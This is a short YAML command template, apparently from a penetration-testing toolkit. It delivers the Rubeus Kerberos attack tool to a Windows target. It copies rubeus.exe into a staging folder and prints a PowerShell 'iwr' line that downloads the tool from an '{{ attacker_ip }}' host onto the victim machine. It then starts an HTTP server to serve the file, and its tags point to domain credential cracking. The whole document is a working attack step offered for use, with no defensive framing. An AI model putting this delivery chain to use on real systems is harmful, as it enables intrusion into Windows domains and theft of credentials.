---
metadata:
  filename: "deliver-windows-rubeus.yaml"
  tags: ["windows", "domain", "cracking"]
  created: "2025-03-29"
  author: "Unknown"

content: |
  mkdir -p packstation/outbound; cp -n {{ tools_dir }}/ghostpack/rubeus.exe packstation/outbound/; \
  echo '================================================================'; \
  echo '                      -----PowerShell-----                      '; \
  echo 'Deliver: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/rubeus.exe -Outfile {{ delivery_path_windows }}\rubeus.exe'; \
  echo '================================================================'; \
  echo '                         -----CMD-----                          '; \
  echo '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
